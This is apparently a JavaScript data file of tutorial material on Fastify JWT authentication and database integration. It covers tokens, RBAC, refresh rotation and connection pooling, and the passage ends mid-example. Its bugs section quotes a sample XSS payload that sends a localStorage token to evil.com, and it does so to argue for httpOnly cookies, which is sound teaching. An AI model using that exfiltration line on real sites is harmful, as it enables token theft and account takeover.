const concepts = [
  {
    id: 6,
    title: "Authentication with fastify-jwt",
    tag: "SIGNING, VERIFYING, AND PROTECTING YOUR API",
    color: "#0F4C75",
    tldr: `@fastify/jwt wraps the jsonwebtoken library into Fastify's plugin system, giving you fastify.jwt.sign() to create tokens and request.jwtVerify() to validate them. The standard pattern is to register an authenticate decorator once and apply it as a preHandler hook — either globally via addHook or per-route. Role-based access control (RBAC) is layered on top: verify identity first, check permissions second.`,
    problem: `
WHY THIS CONCEPT EXISTS / WHAT CONFUSION IT SOLVES:
----------------------------------------------------
"How do I protect routes so only logged-in users can access them?"
  → @fastify/jwt + fastify.decorate('authenticate', ...) pattern.
  → authenticate is an async function that calls request.jwtVerify().
  → Apply it as preHandler: [fastify.authenticate] on any route or scope.
  → JWT verified before handler runs. Invalid token → 401 before any DB query.

"Should I put authenticate in a global addHook or per-route preHandler?"
  → Global addHook: every route protected. Need explicit opt-out for public routes.
  → Per-route/per-plugin: explicit opt-in. Public routes unaffected.
  → Best pattern: global addHook with skip logic for routes marked { config: { public: true } }.
  → OR: register private routes in a plugin scope with the auth hook inside.

"What's in the JWT payload and how do I access it in the handler?"
  → After request.jwtVerify(): decoded payload available as request.user.
  → Payload typically: { sub: userId, role: 'admin', tenantId: 123, iat: ..., exp: ... }
  → Must decorateRequest('user', null) first for V8 optimization and TypeScript types.

"How do I implement refresh tokens without a database?"
  → Access token: short-lived (15 min), contains role + userId.
  → Refresh token: long-lived (7 days), contains only userId + tokenVersion.
  → Refresh endpoint: verifies refresh token, checks tokenVersion in DB, issues new access token.
  → Token rotation: increment tokenVersion on refresh → old refresh tokens invalid.

"Cookie-based JWT vs Authorization header — which and when?"
  → Authorization header (Bearer token): better for API-only clients, mobile apps, SPAs with token storage.
  → Cookie (httpOnly): better for server-rendered apps, prevents XSS token theft.
  → @fastify/cookie + @fastify/jwt: set JWT in httpOnly cookie on login, read from cookie on verify.
  → Cookies need CSRF protection. Headers don't.
    `,
    analogy: `
THE CONCERT TICKET ANALOGY:
----------------------------
JWT = A CONCERT TICKET WITH TAMPER-EVIDENT SEAL:
  When you buy a ticket (login), the venue (server) prints your ticket with:
    - Your name (userId)
    - Your seat section (role: 'vip', 'general')
    - The concert date (expiry: iat + exp)
    - A holographic seal (HMAC signature with server's secret key)
  
  At every entrance (route), security checks:
    1. Is the seal genuine? (signature verification — can't fake without the secret)
    2. Is the ticket still valid? (exp hasn't passed)
    3. Is your section allowed here? (role check)
  
  Security never calls the box office (database) to verify each ticket.
  The seal IS the proof. Stateless — no lookup needed.

THE FASTIFY.AUTHENTICATE DECORATOR = THE SECURITY GUARD FUNCTION:
  Instead of writing the verification code at every entrance:
    fastify.decorate('authenticate', async function(request, reply) {
      await request.jwtVerify(); // Check the seal
    });
  
  You hire one security guard template (decorator) and deploy them at every entrance:
    fastify.post('/pay', { preHandler: [fastify.authenticate] }, handler)
    fastify.get('/profile', { preHandler: [fastify.authenticate] }, handler)
  
  Same guard, same verification, every time. Change the logic once → updates everywhere.

RBAC = THE VIP BACKSTAGE PASS:
  Regular ticket: passes authenticate (you're in the venue).
  Backstage requires ADDITIONAL check (role: 'admin').
  
  Two guards at backstage entrance:
  1. Guard 1 (authenticate): "Is your ticket valid?" — checks JWT signature.
  2. Guard 2 (adminOnly): "Is your ticket a VIP pass?" — checks role claim.
  
  preHandler: [fastify.authenticate, fastify.adminOnly]
  → Must pass BOTH guards in sequence.

REFRESH TOKEN = THE SEASON PASS RENEWAL COUNTER:
  Access token (concert ticket): valid for tonight only (15 min).
  Refresh token (season pass membership card): valid for 7 days.
  
  When tonight's ticket expires:
    Go to the renewal counter (POST /auth/refresh).
    Show your membership card (refresh token).
    Counter checks: is this card number still active in our system?
    If yes: print a new tonight's ticket (new access token).
    If no (membership cancelled / card reported stolen): no new ticket.
    
  tokenVersion in DB: incrementing it = cancelling all existing season passes.
  User changes password: tokenVersion++ → all refresh tokens invalidated.
    `,
    deep: `
DEEP TECHNICAL BREAKDOWN — FASTIFY-JWT INTERNALS:
-------------------------------------------------

@FASTIFY/JWT SETUP AND OPTIONS:
  fastify.register(require('@fastify/jwt'), {
    secret: process.env.JWT_SECRET,          // String or { public, private } for RS256
    sign: {
      algorithm: 'HS256',                    // Default. Use RS256 for asymmetric.
      expiresIn: '15m',                      // Access token lifetime
      issuer: 'myapp.com',                   // iss claim
      audience: 'myapp-users'               // aud claim
    },
    verify: {
      issuer: 'myapp.com',                   // Verified on jwtVerify()
      audience: 'myapp-users'
    },
    cookie: {
      cookieName: 'token',                   // Read JWT from this cookie
      signed: false                          // Whether cookie is signed
    },
    trusted: (decoded, decodedFull) => true, // Custom trust function
    namespace: 'security',                   // Multiple JWT instances: fastify.security.sign()
  });

FASTIFY.JWT.SIGN() vs REQUEST.JWTVERIFY():
  fastify.jwt.sign(payload, [options]):
    → Creates a JWT string. Options override defaults (expiresIn, etc.)
    → Returns string synchronously OR Promise (async version).
    
  fastify.jwt.verify(token, [options]):
    → Verifies a token string. Returns decoded payload or throws.
    → Lower-level: doesn't read from request automatically.
    
  request.jwtVerify([options]):
    → High-level: reads token from Authorization header OR cookie automatically.
    → Sets request.user = decoded payload.
    → Throws on invalid/expired token.

JWT PAYLOAD BEST PRACTICES:
  Include: sub (userId), role, tenantId, tokenVersion, iat, exp, jti (token ID for revocation)
  Exclude: password, sensitive PII, anything that changes frequently
  Keep small: JWT is sent with every request. 5KB payload = 5KB overhead per request.
  
  Typical structure:
  {
    sub: '42',           // Subject: userId as string (JWT spec: sub should be string)
    role: 'seller',
    tenantId: 7,
    email: 'priya@myapp.com',  // Optional: avoid if changes frequently
    iat: 1704067200,
    exp: 1704068100     // iat + 15 minutes
  }

TOKEN REVOCATION STRATEGIES:
  Problem: JWT is stateless. Can't "delete" a token before expiry.
  
  Strategy 1 — Short expiry + refresh tokens:
    Access token: 15min expiry. Compromise → self-heals in 15 min.
    Refresh token: stored in DB. Can be deleted on logout/password change.
    
  Strategy 2 — Token blocklist (Redis):
    On logout: store jti (JWT ID) in Redis with TTL = remaining exp time.
    On jwtVerify: check Redis blocklist. If jti in blocklist → reject.
    Cost: Redis lookup per request (tiny, ~0.5ms).
    
  Strategy 3 — tokenVersion in DB (for refresh tokens):
    User has tokenVersion field. Refresh token encodes this version.
    On verify: check tokenVersion in DB matches token's version.
    Increment tokenVersion = invalidate ALL refresh tokens for user.

COOKIE-BASED JWT:
  Setup:
    fastify.register(require('@fastify/cookie'));
    fastify.register(require('@fastify/jwt'), {
      secret: process.env.JWT_SECRET,
      cookie: { cookieName: 'authToken', signed: false }
    });
  
  On login:
    reply.setCookie('authToken', token, {
      httpOnly: true,          // JS cannot read this cookie (XSS protection)
      secure: true,            // HTTPS only
      sameSite: 'strict',      // CSRF protection: only sent from same origin
      path: '/',
      maxAge: 15 * 60          // 15 minutes in seconds
    });
  
  On verify:
    request.jwtVerify() automatically reads from cookie if configured.
  
  CSRF considerations:
    sameSite: 'strict' → cookie NOT sent with cross-origin requests. CSRF prevented.
    sameSite: 'lax' → sent for top-level navigation. Some CSRF risk.
    sameSite: 'none' → sent everywhere. Needs CSRF token or Origin header check.

RS256 ASYMMETRIC SIGNING:
  Use case: microservices where auth service signs and other services only verify.
    Auth service: has private key → signs tokens.
    Product service, Order service: have public key only → verify tokens (can't sign).
  
  Setup:
    // Generate: openssl genrsa -out private.key 2048
    //           openssl rsa -in private.key -pubout -out public.key
    fastify.register(require('@fastify/jwt'), {
      secret: {
        private: fs.readFileSync('./private.key'),
        public: fs.readFileSync('./public.key')
      },
      sign: { algorithm: 'RS256' }
    });
    `,
    code: `
// ===== AUTHENTICATION WITH FASTIFY-JWT — EXAMPLES =====

// EXAMPLE 1: Basic JWT setup with authenticate decorator

// const fastify = Fastify({ logger: true });
//
// fastify.register(require('@fastify/jwt'), {
//   secret: process.env.JWT_SECRET,
//   sign: { expiresIn: '15m' }
// });
//
// // Pre-declare request.user shape for V8 + TypeScript:
// fastify.decorateRequest('user', null);
//
// // Authenticate decorator — reusable auth function:
// fastify.decorate('authenticate', async function authenticate(request, reply) {
//   try {
//     await request.jwtVerify();
//     // request.user is now populated with decoded JWT payload
//   } catch (err) {
//     reply.status(401).send({ error: 'Unauthorized', message: 'Valid token required' });
//   }
// });

// EXAMPLE 2: Login and token issuance

// fastify.post('/auth/login', {
//   schema: {
//     body: {
//       type: 'object',
//       required: ['email', 'password'],
//       properties: {
//         email: { type: 'string', format: 'email' },
//         password: { type: 'string', minLength: 8 }
//       }
//     },
//     response: {
//       200: {
//         type: 'object',
//         properties: {
//           accessToken: { type: 'string' },
//           refreshToken: { type: 'string' },
//           expiresIn: { type: 'integer' }
//         }
//       }
//     }
//   }
// }, async (request, reply) => {
//   const { email, password } = request.body;
//
//   const user = await fastify.db.query.users.findFirst({
//     where: eq(users.email, email)
//   });
//   if (!user) return reply.status(401).send({ error: 'Invalid credentials' });
//
//   const valid = await bcrypt.compare(password, user.passwordHash);
//   if (!valid) return reply.status(401).send({ error: 'Invalid credentials' });
//
//   // Issue access token (short-lived):
//   const accessToken = fastify.jwt.sign({
//     sub: user.id.toString(),
//     email: user.email,
//     role: user.role,
//     tenantId: user.tenantId
//   });
//
//   // Issue refresh token (long-lived, only userId + version):
//   const refreshToken = fastify.jwt.sign(
//     { sub: user.id.toString(), tokenVersion: user.tokenVersion },
//     { expiresIn: '7d' }
//   );
//
//   return { accessToken, refreshToken, expiresIn: 900 }; // 15 min = 900 seconds
// });

// EXAMPLE 3: RBAC — role-based access control

// // Role check decorator:
// fastify.decorate('authorize', function authorize(...roles) {
//   return async function(request, reply) {
//     // authenticate must have run first (request.user populated)
//     const userRole = request.user?.role;
//     if (!roles.includes(userRole)) {
//       return reply.status(403).send({
//         error: 'Forbidden',
//         message: \`Required role: \${roles.join(' or ')}\`
//       });
//     }
//   };
// });
//
// // Usage:
// fastify.get('/admin/users', {
//   preHandler: [fastify.authenticate, fastify.authorize('admin')]
// }, async (request) => {
//   return fastify.db.query.users.findMany();
// });
//
// fastify.get('/reports', {
//   preHandler: [fastify.authenticate, fastify.authorize('admin', 'manager')]
// }, async (request) => {
//   return fastify.db.getReports(request.user.tenantId);
// });

// EXAMPLE 4: Refresh token endpoint

// fastify.post('/auth/refresh', {
//   schema: {
//     body: {
//       type: 'object',
//       required: ['refreshToken'],
//       properties: { refreshToken: { type: 'string' } }
//     }
//   }
// }, async (request, reply) => {
//   let decoded;
//   try {
//     decoded = fastify.jwt.verify(request.body.refreshToken);
//   } catch {
//     return reply.status(401).send({ error: 'Invalid refresh token' });
//   }
//
//   // Check tokenVersion in DB (invalidates rotated tokens):
//   const user = await fastify.db.query.users.findFirst({
//     where: eq(users.id, parseInt(decoded.sub)),
//     columns: { id: true, email: true, role: true, tenantId: true, tokenVersion: true }
//   });
//
//   if (!user || user.tokenVersion !== decoded.tokenVersion) {
//     return reply.status(401).send({ error: 'Refresh token has been revoked' });
//   }
//
//   // Issue new access token:
//   const accessToken = fastify.jwt.sign({
//     sub: user.id.toString(), email: user.email, role: user.role, tenantId: user.tenantId
//   });
//
//   // Rotate refresh token (issue new one, old one still valid until exp — acceptable):
//   const newRefreshToken = fastify.jwt.sign(
//     { sub: user.id.toString(), tokenVersion: user.tokenVersion },
//     { expiresIn: '7d' }
//   );
//
//   return { accessToken, refreshToken: newRefreshToken, expiresIn: 900 };
// });

// EXAMPLE 5: Cookie-based JWT (for browser apps)

// fastify.register(require('@fastify/cookie'));
// fastify.register(require('@fastify/jwt'), {
//   secret: process.env.JWT_SECRET,
//   cookie: { cookieName: 'authToken', signed: false },
//   sign: { expiresIn: '15m' }
// });
//
// // Login: set cookie:
// fastify.post('/auth/login', loginSchema, async (request, reply) => {
//   const user = await verifyCredentials(request.body);
//   const token = fastify.jwt.sign({ sub: user.id, role: user.role });
//   reply
//     .setCookie('authToken', token, {
//       httpOnly: true, secure: process.env.NODE_ENV === 'production',
//       sameSite: 'strict', path: '/', maxAge: 900
//     })
//     .send({ message: 'Logged in successfully' });
// });
//
// // Logout: clear cookie:
// fastify.post('/auth/logout', { preHandler: [fastify.authenticate] }, async (request, reply) => {
//   reply.clearCookie('authToken', { path: '/' }).send({ message: 'Logged out' });
// });

// EXAMPLE 6: Global auth with public route opt-out

// fastify.addHook('onRequest', async (request, reply) => {
//   // Skip auth for routes marked public:
//   if (request.routeConfig?.public) return;
//   try {
//     await request.jwtVerify();
//   } catch {
//     return reply.status(401).send({ error: 'Unauthorized' });
//   }
// });
//
// // Public routes (no auth needed):
// fastify.get('/health', { config: { public: true } }, async () => ({ status: 'ok' }));
// fastify.post('/auth/login', { config: { public: true } }, loginHandler);
//
// // Protected (no preHandler needed — global hook covers it):
// fastify.get('/orders', ordersHandler);
// fastify.get('/profile', profileHandler);

// EXAMPLE 7: Multi-tenant JWT with tenant context

// fastify.decorateRequest('tenantId', null);
//
// fastify.decorate('authenticate', async function(request, reply) {
//   try {
//     await request.jwtVerify();
//     request.tenantId = request.user.tenantId;
//
//     // Verify tenant still active (optional but recommended):
//     const tenant = await fastify.redis.get(\`tenant:\${request.tenantId}:active\`);
//     if (!tenant) {
//       // Cache miss: check DB (then cache):
//       const t = await fastify.db.query.tenants.findFirst({
//         where: eq(tenants.id, request.tenantId)
//       });
//       if (!t || t.status !== 'active') {
//         return reply.status(403).send({ error: 'Tenant account suspended' });
//       }
//       await fastify.redis.setex(\`tenant:\${t.id}:active\`, 300, '1');
//     }
//   } catch (err) {
//     reply.status(401).send({ error: 'Unauthorized' });
//   }
// });
    `,
    bugs: `
REAL PRODUCTION BUGS FROM JWT AUTHENTICATION MISUNDERSTANDING:
-------------------------------------------------------------

BUG 1: JWT secret in code — tokens forged after source code leak
  Scenario: Developer hardcoded secret in plugin registration:
    fastify.register(require('@fastify/jwt'), { secret: 'mysecret123' });
    Code committed to GitHub (private repo). Repo accidentally made public for 2 hours.
    Attacker cloned repo. Forged JWT with role: 'admin'. Accessed all admin endpoints.
    All user data compromised. GDPR notification required.
  Root cause: JWT secret in source code = any code reader can forge tokens.
  Fix:
    fastify.register(require('@fastify/jwt'), { secret: process.env.JWT_SECRET });
    Use a long random secret (>= 256 bits): openssl rand -hex 32
    Rotate the secret: all existing tokens become invalid immediately.
    Use asymmetric (RS256) for microservices so services only need public key.

BUG 2: Not checking role after jwtVerify — horizontal privilege escalation
  Scenario: User profile endpoint:
    fastify.get('/users/:id/sensitive-data', {
      preHandler: [fastify.authenticate] // Only checks: is token valid?
    }, async (request) => {
      return fastify.db.getSensitiveData(request.params.id); // Uses params.id, not token sub!
    });
    User Priya (userId 42) requested /users/99/sensitive-data.
    Token valid. No check: does request.user.sub === request.params.id?
    Priya accessed Rohan's sensitive data.
  Root cause: Authentication (who are you?) != Authorization (can you do this?).
    authenticate confirms token is valid. Doesn't check if user owns the resource.
  Fix:
    fastify.get('/users/:id/sensitive-data', {
      preHandler: [fastify.authenticate]
    }, async (request, reply) => {
      if (request.user.sub !== request.params.id && request.user.role !== 'admin') {
        return reply.status(403).send({ error: 'Access denied' });
      }
      return fastify.db.getSensitiveData(request.params.id);
    });

BUG 3: Refresh token not invalidated on password change — compromised account persists
  Scenario: User's password stolen. Attacker has both access and refresh tokens.
    User changes password → access token expires after 15 min. Good.
    But: refresh token NOT invalidated (tokenVersion not incremented).
    Attacker uses refresh token to get new access tokens. Indefinitely.
    Password change was useless for 7 days (refresh token lifetime).
  Root cause: tokenVersion not incremented on password/security events.
  Fix: On password change, email change, security event:
    await db.update(users)
      .set({ tokenVersion: sql\`token_version + 1\`, passwordHash: newHash })
      .where(eq(users.id, userId));
    // All existing refresh tokens now have stale tokenVersion → rejected on use.

BUG 4: JWT in localStorage vulnerable to XSS — tokens stolen by injected script
  Scenario: SPA stored JWT in localStorage:
    localStorage.setItem('authToken', token); // Common but insecure
    A third-party analytics script was compromised. XSS payload injected:
    // Attacker's script:
    fetch('https://evil.com/steal', { method: 'POST',
      body: localStorage.getItem('authToken') });
    All active users' tokens exfiltrated. Mass account takeover.
  Root cause: localStorage is accessible by any JavaScript on the page (XSS target).
  Fix: Use httpOnly cookies. Not accessible by JavaScript at all.
    reply.setCookie('authToken', token, {
      httpOnly: true,  // JavaScript CANNOT read this
      secure: true,    // HTTPS only
      sameSite: 'strict'
    });
    For SPAs that need the token client-side: use memory storage (JS variable).
    Persists for the session. Refreshed via refresh token stored in httpOnly cookie.

BUG 5: Long-lived access tokens compensating for "refresh token is complex"
  Scenario: Developer found refresh token flow complex, set access token to 24h expiry:
    fastify.register(require('@fastify/jwt'), { sign: { expiresIn: '24h' } });
    User's account suspended (fraud detected). Token revoked in DB.
    But: existing token valid for up to 24 more hours after suspension.
    Suspended user continued accessing the platform for up to a day.
  Root cause: Long-lived tokens can't be revoked without a blocklist.
    15-minute tokens limit damage window. 24h tokens are effectively "no revocation."
  Fix: Short access token (15m) + refresh token (7d) stored in DB.
    On suspension: delete refresh tokens from DB immediately.
    Damage window: max 15 minutes for existing access tokens.
    Or: Redis blocklist with jti for immediate revocation.
    `,
    challenge: `
CHALLENGES:
-----------

CHALLENGE 1 — PREDICT THE AUTH BEHAVIOR:
  Server setup:
  fastify.register('@fastify/jwt', { secret: 'secret', sign: { expiresIn: '15m' } });
  fastify.decorateRequest('user', null);
  fastify.decorate('authenticate', async (req, rep) => {
    try { await req.jwtVerify(); } catch { rep.status(401).send({ error: 'Unauthorized' }); }
  });

  Routes:
  fastify.get('/public', { config: { public: true } }, async () => ({ data: 'public' }));
  fastify.get('/private', { preHandler: [fastify.authenticate] }, async (req) => ({
    userId: req.user.sub
  }));
  fastify.get('/admin', {
    preHandler: [
      fastify.authenticate,
      async (req, rep) => { if (req.user.role !== 'admin') rep.status(403).send(); }
    ]
  }, async () => ({ admin: true }));

  For each request, predict the response status and body:
  a) GET /public (no token)
  b) GET /private (no token)
  c) GET /private with valid token { sub: '1', role: 'user' }
  d) GET /admin with valid token { sub: '1', role: 'user' }
  e) GET /admin with valid token { sub: '1', role: 'admin' }
  f) GET /private with expired token

  For (d): What's the critical bug with the admin preHandler as written?
  (Hint: What happens after rep.status(403).send() — does the next handler still run?)

CHALLENGE 2 — FIX THE AUTH BUGS:
  This auth implementation has 3 security bugs. Find and fix each.

  // Bug 1: Hardcoded secret
  fastify.register(require('@fastify/jwt'), {
    secret: 'hardcoded-dev-secret',
    sign: { expiresIn: '30d' }  // Bug 2: 30-day access token
  });

  // Bug 3: Resource ownership not checked
  fastify.get('/invoices/:id', {
    preHandler: [fastify.authenticate]
  }, async (request) => {
    // Returns invoice for :id regardless of who's asking
    return fastify.db.getInvoice(request.params.id);
  });

  // Also: describe what should happen when the user changes their password.
  // What additional change to the DB schema and login handler is needed?

CHALLENGE 3 — BUILD FROM SCRATCH:
  Build a complete authentication system for a fintech app.

  Requirements:
  1. POST /auth/register: create user, hash password (bcrypt), issue tokens
  2. POST /auth/login: verify credentials, issue accessToken (15min) + refreshToken (7d)
     - refreshToken stored as httpOnly cookie (not in response body)
     - accessToken in response body (for SPA memory storage)
  3. POST /auth/refresh: read refreshToken from cookie, validate tokenVersion,
     issue new accessToken, rotate refreshToken cookie
  4. POST /auth/logout: clear cookie, increment tokenVersion (invalidate all refresh tokens)
  5. GET /me: returns current user profile (requires authenticate)
  6. RBAC: 3 roles: 'customer', 'agent', 'admin'
     - GET /admin/stats: admin only
     - GET /support/tickets: agent + admin
     - GET /my/transactions: any authenticated user (own data only)

  Schema: users table with id, email, passwordHash, role, tokenVersion, createdAt
  Show: plugin file for auth, all route handlers, decorators, TypeScript types for request.user
    `,
    summary: `fastify-jwt authentication follows a clear pattern: register the plugin once, create an authenticate decorator that calls request.jwtVerify(), and apply it as preHandler wherever auth is needed. The non-negotiable security practices are short-lived access tokens (15 minutes), rotation-based refresh tokens with a tokenVersion column to enable instant revocation, and httpOnly cookies when the client is a browser to prevent XSS token theft.`
  },

  {
    id: 7,
    title: "Database Integration with Fastify",
    tag: "CONNECTING, POOLING, AND QUERYING SAFELY IN A FASTIFY APP",
    color: "#166534",
    tldr: `Database clients in Fastify are registered as decorators via fp-wrapped plugins — a database connection pool is created once at startup, decorated onto the Fastify instance as fastify.db, and gracefully closed via addHook('onClose', ...) when the server shuts down. Transactions in route handlers use a request-scoped pattern to ensure the same connection is used throughout a single request's operations.`,
    problem: `
WHY THIS CONCEPT EXISTS / WHAT CONFUSION IT SOLVES:
----------------------------------------------------
"Where do I create the database connection — inside each route handler?"
  → Never. Creating a new connection per request = connection pool exhaustion.
  → Create ONE pool at startup. Reuse connections across all requests.
  → Pattern: fp-wrapped plugin creates pool → decorates fastify.db → all routes use fastify.db.

"What happens to database connections when the server shuts down?"
  → Without cleanup: connections hang, PostgreSQL thinks they're still active.
  → Pool exhaustion on next deploy: old connections never released.
  → addHook('onClose', ...) runs cleanup code when fastify.close() is called.
  → Best practice: always register onClose for every resource (DB pool, Redis, file handles).

"How do I pass a transaction to multiple functions inside a route handler?"
  → Problem: two separate DB calls in different functions must share the same transaction.
  → Pattern 1: pass tx as a function parameter (most explicit, recommended).
  → Pattern 2: request-scoped transaction: attach tx to request object in preHandler,
    all functions receive request and access request.tx.
  → Both work. Pattern 1 is cleaner and more testable.

"My route makes 5 separate DB queries — is that causing N+1?"
  → N+1: loading a list, then querying details for EACH item individually.
  → Example: get 20 orders, then for each order query the customer name = 21 queries.
  → Fix: use JOIN or SQL IN clause to batch-load related data.
  → With Drizzle: use db.query.orders.findMany({ with: { customer: true } }) → JOIN.

"Can I use Drizzle AND raw pg in the same Fastify app?"
  → Yes: Drizzle wraps the pg Pool. You can always access the raw pool via db.\$client.
  → Or: register @fastify/postgres separately for raw pg alongside Drizzle for ORM queries.
  → Use Drizzle for CRUD, raw pg for complex analytics SQL or COPY operations.
    `,
    analogy: `
THE HOTEL CONCIERGE DESK ANALOGY:
-----------------------------------
DATABASE POOL = THE HOTEL'S CONCIERGE TEAM:
  Hotel has 10 concierges (database connections) at the front desk.
  Guests (requests) arrive and need help (DB queries).
  Guest says "I need help" → available concierge handles it → returns to desk.
  
  Without pool (new connection per request):
    Every guest hired their OWN private concierge, who left after the task.
    Cost: hiring + firing overhead per request. At 1000 guests: chaos.
  
  With pool (reuse connections):
    Same 10 concierges handle ALL guests in turns.
    Expensive setup (connect to PostgreSQL) done ONCE at startup.
    Each request: borrows a concierge → task done → concierge returns to pool.
    Fast: no new connection overhead per request.

FP-WRAPPED DB PLUGIN = THE HOTEL MANAGER SETTING UP THE DESK:
  Manager (plugin) sets up the concierge team at hotel opening (server startup).
  Manager doesn't keep the team in their office (isolated plugin scope).
  Manager uses fp() to put the team in the main lobby (root scope).
  Now every floor (every plugin, every route) can call the front desk (fastify.db).

ONCLOSE HOOK = THE HOTEL CLOSING PROCEDURE:
  When hotel closes (server shuts down):
    Manager calls: "Release all concierges, close the booking system."
    addHook('onClose', () => pool.end())
  Without this: concierges stand at the door forever.
  PostgreSQL: "Why are 10 connections still open from that app that stopped?" → pool leak.

REQUEST-SCOPED TRANSACTION = THE DEDICATED ESCORT:
  Complex VIP guest request: "Book restaurant + arrange car + get flowers."
  All three tasks must be handled by the SAME concierge (same DB connection for transaction).
  
  Pattern: attach the dedicated concierge to the guest's wristband (request.tx).
  All functions helping the guest: check the wristband → use the same concierge.
  
  If any task fails: the concierge undoes everything (ROLLBACK).
  Only when all tasks succeed: concierge finalizes (COMMIT).

N+1 = SENDING 21 LETTERS TO ONE OFFICE INSTEAD OF ONE LETTER:
  Get list of 20 orders: 1 DB query. Good.
  For each order, get customer name: 20 separate DB queries. BAD.
  Total: 21 queries for what could be 1 query with a JOIN.
  
  At scale: 100 orders = 101 queries. 1000 orders = 1001 queries.
  Response time: proportional to N. Linear degradation.
  
  Fix: JOIN in SQL lets the database do the work of combining data.
  One letter to the database: "Give me orders AND their customer names."
  Database returns everything in one response.
    `,
    deep: `
DEEP TECHNICAL BREAKDOWN — DATABASE INTEGRATION INTERNALS:
---------------------------------------------------------

PG POOL LIFECYCLE IN FASTIFY:
  startup: register plugin → pool.connect() tests connectivity → pool ready
  request: route handler → db query → pool lends connection → query executes → connection returned
  shutdown: fastify.close() → onClose hook → pool.end() → all connections closed gracefully
  
  Pool options (pg Pool):
  {
    max: 10,                    // Maximum connections in pool
    min: 2,                     // Minimum idle connections kept warm
    idleTimeoutMillis: 30000,   // Close idle connections after 30s
    connectionTimeoutMillis: 5000, // Throw if can't get connection in 5s
    allowExitOnIdle: true       // Allow Node process to exit when pool idle
  }
  
  Connection string vs object config:
    connectionString: 'postgresql://user:pass@host:5432/db?sslmode=require'
    OR: { host, port, database, user, password, ssl }
  
  Health check: some production setups run a query on pool.connect():
    pool.on('connect', (client) => { client.query('SELECT 1'); });

DRIZZLE + FASTIFY PLUGIN PATTERN:
  // plugins/database.js
  // const fp = require('fastify-plugin');
  // const { Pool } = require('pg');
  // const { drizzle } = require('drizzle-orm/node-postgres');
  // const schema = require('../db/schema');
  //
  // async function dbPlugin(fastify, opts) {
  //   const pool = new Pool({ connectionString: fastify.config.databaseUrl, max: 10 });
  //
  //   // Verify connection at startup (fail fast):
  //   const client = await pool.connect();
  //   await client.query('SELECT 1');
  //   client.release();
  //   fastify.log.info('Database connection established');
  //
  //   const db = drizzle(pool, { schema, logger: fastify.config.env === 'development' });
  //   fastify.decorate('db', db);
  //
  //   // Graceful shutdown:
  //   fastify.addHook('onClose', async (instance) => {
  //     await pool.end();
  //     instance.log.info('Database pool closed');
  //   });
  // }
  // module.exports = fp(dbPlugin, { name: 'database', dependencies: ['config'] });

REQUEST-SCOPED TRANSACTIONS:
  Two patterns:
  
  Pattern 1 — Parameter passing (preferred):
    async function createOrder(db, customerId, items) {
      return db.transaction(async (tx) => {
        const [order] = await tx.insert(orders).values({ customerId, status: 'pending' }).returning();
        await tx.insert(orderItems).values(items.map(i => ({ orderId: order.id, ...i })));
        return order;
      });
    }
    // In handler:
    const order = await createOrder(fastify.db, request.user.sub, request.body.items);
  
  Pattern 2 — Request attachment (useful for layered architectures):
    fastify.decorateRequest('tx', null);
    fastify.addHook('preHandler', async (request) => {
      // Note: this creates a transaction for EVERY request — only do this if all routes use transactions
      // Better: attach on demand in route handler
    });
    // In specific routes that need cross-function transaction:
    await fastify.db.transaction(async (tx) => {
      request.tx = tx; // Attach for use in service functions
      await orderService.create(request); // Uses request.tx internally
    });

@FASTIFY/POSTGRES FOR RAW PG:
  For cases where you need raw pg access alongside or instead of Drizzle:
  
  // fastify.register(require('@fastify/postgres'), {
  //   connectionString: process.env.DATABASE_URL
  // });
  //
  // // In route:
  // fastify.get('/stats', async (request, reply) => {
  //   const client = await fastify.pg.connect(); // Get a client from the pool
  //   try {
  //     const { rows } = await client.query(
  //       'SELECT COUNT(*) as total, SUM(amount) as revenue FROM orders WHERE tenant_id = $1',
  //       [request.user.tenantId]
  //     );
  //     return rows[0];
  //   } finally {
  //     client.release(); // MUST release — otherwise pool exhaustion
  //   }
  // });
  //
  // // Or shorthand (auto-releases):
  // fastify.get('/count', async () => {
  //   const { rows } = await fastify.pg.query('SELECT COUNT(*) FROM users');
  //   return rows[0];
  // });

N+1 DETECTION AND PREVENTION:
  Detection: add query counter middleware in development:
    let queryCount = 0;
    if (process.env.NODE_ENV === 'development') {
      fastify.addHook('onRequest', async (request) => { request.queryCount = 0; });
      fastify.addHook('onResponse', async (request, reply) => {
        if (request.queryCount > 5) {
          fastify.log.warn({ url: request.url, queryCount: request.queryCount }, 'Potential N+1');
        }
      });
    }
  
  Prevention patterns:
  1. Eager loading with Drizzle relations:
     db.query.orders.findMany({ with: { customer: true, items: { with: { product: true } } } })
     → Single JOIN query. No N+1.
  
  2. Manual batch loading with SQL IN:
     const orderIds = orders.map(o => o.id);
     const items = await db.select().from(orderItems).where(inArray(orderItems.orderId, orderIds));
     // Group in JavaScript:
     const itemsByOrder = groupBy(items, 'orderId');
     const enriched = orders.map(o => ({ ...o, items: itemsByOrder[o.id] ?? [] }));
  
  3. DataLoader pattern (batching + caching):
     Use a DataLoader library to batch multiple individual queries into one IN query.
    `,
    code: `
// ===== DATABASE INTEGRATION WITH FASTIFY — EXAMPLES =====

// EXAMPLE 1: Complete database plugin with Drizzle

// // plugins/database.js
// const fp = require('fastify-plugin');
// const { Pool } = require('pg');
// const { drizzle } = require('drizzle-orm/node-postgres');
// // const * as schema from '../db/schema';
//
// async function databasePlugin(fastify, opts) {
//   const pool = new Pool({
//     connectionString: fastify.config.databaseUrl,
//     max: fastify.config.env === 'production' ? 20 : 5,
//     idleTimeoutMillis: 30000,
//     connectionTimeoutMillis: 5000,
//   });
//
//   // Monitor pool events:
//   pool.on('error', (err) => fastify.log.error({ err }, 'Database pool error'));
//   pool.on('connect', () => fastify.log.debug('New database connection established'));
//
//   // Fail fast: verify connectivity before server accepts requests:
//   try {
//     const client = await pool.connect();
//     await client.query('SELECT 1');
//     client.release();
//     fastify.log.info('Database connection verified');
//   } catch (err) {
//     fastify.log.fatal({ err }, 'Failed to connect to database');
//     throw err; // Server won't start
//   }
//
//   const db = drizzle(pool, {
//     schema,
//     logger: fastify.config.env !== 'production'
//   });
//
//   fastify.decorate('db', db);
//   fastify.decorate('dbPool', pool); // Expose raw pool for edge cases
//
//   fastify.addHook('onClose', async (instance) => {
//     fastify.log.info('Closing database pool...');
//     await pool.end();
//     fastify.log.info('Database pool closed');
//   });
// }
//
// module.exports = fp(databasePlugin, {
//   name: 'database',
//   dependencies: ['config']
// });

// EXAMPLE 2: Repository pattern with Fastify db decorator

// // services/orderRepository.js
// class OrderRepository {
//   constructor(db) { this.db = db; }
//
//   async findById(orderId, tenantId) {
//     const [order] = await this.db.select()
//       .from(orders)
//       .where(and(eq(orders.id, orderId), eq(orders.tenantId, tenantId)));
//     return order ?? null;
